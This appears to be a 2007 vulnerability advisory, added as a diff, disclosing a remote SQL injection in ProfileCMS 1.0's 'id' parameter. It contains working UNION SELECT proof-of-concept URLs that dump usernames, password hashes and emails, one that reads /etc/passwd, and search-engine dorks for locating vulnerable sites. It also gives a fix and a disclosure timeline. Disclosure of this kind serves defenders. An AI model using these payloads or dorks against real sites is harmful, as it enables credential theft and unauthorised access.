@@ -1,0 +1,91 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_84$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_84$2007] ProfileCMS <= 1.0 Remote SQL Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : November, 17 th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv84-K-159-2007.txt
+Critical Lvl   : Dangerous
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : ProfileCMS  
+version       : <= 1.0
+Vendor        : http://profilecms.com/
+Description :
+
+ProfileCMS is a powerful Content Management System for Social Networking profile codes and widgets. There are no other scripts that offer the freedom, features and practicality of ProfileCMS, we have constructed a easy to use, accessable platform for both webmasters and front end users. Based on the popular MSCMS system which has been the Number 1 Myspace Content Management System for almost 1 year now, ProfileCMS allows webmasters to take advantage of the ever growing popularity of social netowrking sites and offer users codes and widgets from ANY social network.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "id" parameter in profiles-codes, video-codes, and arcade-games modules is not properly verified before being used to sql query. 
+This can be exploited thru the browser and get the hash md5 password from users.
+Successful exploitation requires that "magic_quotes" is off.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://target.com/index.php?app=profile-codes&action=codes&id=-1%20union%20select%201,2,concat(id,0x3a,username,0x3a,password,0x3a,email),4,5,6,7,8,9,10%20from%20users/*
+http://target.org/index.php?app=video-codes&action=videos&id=-1%20union%20select%201,concat(id,0x3a,username,0x3a,password,0x3a,email),3,4,5,6%20from%20users/*
+http://target.net/index.php?app=arcade-games&action=games&id=-1%20union%20select%201,concat(id,0x3a,username,0x3a,password,0x3a,email),3,4,5,6%20from%20users/*
+http://target.net/index.php?app=arcade-games&action=games&id=-1%20union%20select%201,load_file(0x2f6574632f706173737764),3,4,5,6%20from%20users/*
+
+Dork:
+~~~~
+Google        : "Powered By ProfileCMS v1.0" or "Total Generators & Widgets"
+Altavista.com : "Total Generators & Widgets"
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn on magic_quotes in php.ini
+ 
+
+Timeline:
+~~~~~~~~
+
+- 15 -11 - 2007 bug found
+- 15 -11 - 2007 vendor contacted
+- 17 -11 - 2007 publish advisory
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, 'zizou' zautha - my lovely son, for all the luv, the tears n the breath
+~ y3dips,the_day,m0by,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra, str0ke
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry,ketut,x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-11-16]
